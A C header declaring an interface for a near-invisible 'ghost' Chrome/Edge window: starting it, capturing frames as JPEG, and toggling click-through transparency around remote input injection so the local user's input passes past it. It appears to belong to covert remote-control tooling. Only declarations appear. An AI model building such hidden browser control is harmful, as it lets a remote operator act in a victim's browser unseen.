/**
 * remote_hidden_browser.h
 * Ghost Chrome/Edge window: launch, reuse, capture, close.
 * Transparency from config.json GhostTransparency (0..100).
 */
#ifndef REMOTE_HIDDEN_BROWSER_H
#define REMOTE_HIDDEN_BROWSER_H

#ifdef __cplusplus
extern "C" {
#endif

/* Start or reuse ghost browser. Returns 1 on success, 0 on failure. */
int remote_hidden_browser_start(const char* profile, const char* url, int ghost_alpha);

/* Capture current frame as JPEG. out_data = 4-byte LE length + JPEG. Returns total size or 0. */
unsigned int remote_hidden_browser_capture_frame(unsigned char* out_data, unsigned int out_size, int quality);

/* Close the ghost window. Returns: 0 = failed, 1 = success, 2 = no ghost window was open. */
int remote_hidden_browser_close(void);

/* Returns 1 if ghost is active and can capture. */
int remote_hidden_browser_is_active(void);

/* Get current ghost window bounds (width, height). Returns 0 if not active. */
int remote_hidden_browser_get_bounds(unsigned int* out_w, unsigned int* out_h);

/* Get ghost HWND for input injection (focus, coordinate mapping). Returns NULL if not active. */
void* remote_hidden_browser_get_hwnd(void);

/* Before remote injection: remove WS_EX_TRANSPARENT so ghost receives input. */
void remote_hidden_browser_prepare_for_input(void);
/* After remote injection: restore WS_EX_TRANSPARENT so local user input passes through. */
void remote_hidden_browser_release_after_input(void);

#ifdef __cplusplus
}
#endif

#endif /* REMOTE_HIDDEN_BROWSER_H */
